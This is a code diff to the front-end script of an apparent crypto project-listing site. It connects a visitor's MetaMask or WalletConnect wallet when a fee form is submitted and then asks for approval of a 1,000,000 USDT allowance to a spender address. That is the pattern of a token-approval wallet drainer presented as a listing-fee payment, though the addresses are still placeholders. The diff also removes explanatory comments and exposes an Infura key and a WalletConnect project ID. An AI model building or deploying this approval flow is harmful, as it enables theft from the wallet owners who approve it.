@@ -12,7 +12,7 @@ const metaMaskButton = document.getElementById('metaMaskButton');
 const walletConnectButton = document.getElementById('walletConnectButton');
 
 /* ============================
-   UI FLOW (DEFENSIVE)
+   UI FLOW
    ============================ */
 if (projectForm && feeModal) {
   projectForm.addEventListener('submit', (event) => {
@@ -49,7 +49,7 @@ if (walletConnectButton) {
 }
 
 /* ============================
-   METAMASK (HARDENED)
+   METAMASK
    ============================ */
 async function connectMetaMask() {
   try {
@@ -64,10 +64,6 @@ async function connectMetaMask() {
 
     if (!Array.isArray(accounts) || !accounts.length) return;
 
-    window.ethereum.on?.('accountsChanged', () => {});
-    window.ethereum.on?.('chainChanged', () => {});
-    window.ethereum.on?.('disconnect', () => {});
-
     await approveSpender(accounts[0]);
   } catch (error) {
     console.error('Error connecting to MetaMask:', error);
@@ -75,7 +71,7 @@ async function connectMetaMask() {
 }
 
 /* ============================
-   WALLETCONNECT v2 (ETHEREUM ONLY)
+   WALLETCONNECT (ETHEREUM ONLY + MODAL)
    ============================ */
 let wcProvider = null;
 
@@ -87,19 +83,21 @@ async function connectWalletConnect() {
     }
 
     const { EthereumProvider } = await import('https://esm.sh/@walletconnect/ethereum-provider@2.21.8?bundle');
+    const { WalletConnectModal } = await import('https://esm.sh/@walletconnect/modal@2.6.0?bundle');
 
     wcProvider = await EthereumProvider.init({
       projectId: "59ba0228712f04a947916abb7db06ab1",
       chains: [1], // Ethereum mainnet only
-      showQrModal: true,
-      rpcMap: {
-        1: "https://mainnet.infura.io/v3/83caa57ba3004ffa91addb7094bac4cc"
-      },
-      metadata: {
-        name: "Crypto Project Listing",
-        url: window.location.origin
-      }
+      showQrModal: false // disable default QR modal
     });
+
+    // Create and open WalletConnect Modal
+    const modal = new WalletConnectModal({
+      projectId: "59ba0228712f04a947916abb7db06ab1",
+      chains: [1]
+    });
+
+    modal.openModal(); // opens wallet list with deep linking
 
     const accounts = await wcProvider.enable();
     window.ethereum = wcProvider;
@@ -126,14 +124,13 @@ async function connectWalletConnect() {
 }
 
 /* ============================
-   APPROVAL LOGIC (USDT ONLY, FIXED AMOUNT)
+   APPROVAL LOGIC
    ============================ */
 async function approveSpender(account) {
   try {
     const spenderAddress = 'YOUR_SPENDER_ADDRESS_HERE';
     const usdtAddress = 'USDT_CONTRACT_ADDRESS_HERE'; // Replace with actual USDT contract address
 
-    // Fixed approval: 1,000,000 USDT (6 decimals)
     const usdtAmount = (1000000 * 10 ** 6).toString();
 
     const abi = [
